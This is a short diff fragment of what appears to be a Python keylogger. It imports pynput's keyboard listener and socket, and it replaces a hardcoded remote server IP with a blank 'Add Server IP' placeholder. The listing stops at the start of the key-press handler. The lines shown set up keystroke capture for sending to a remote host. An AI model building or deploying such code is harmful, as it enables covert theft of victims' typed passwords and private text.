@@ -1,7 +1,7 @@
 import socket
 from pynput import keyboard
 
-HOST = '172.105.172.98'
+HOST = ''	## Add Server IP
 PORT = 65535
 
 def on_press(key):
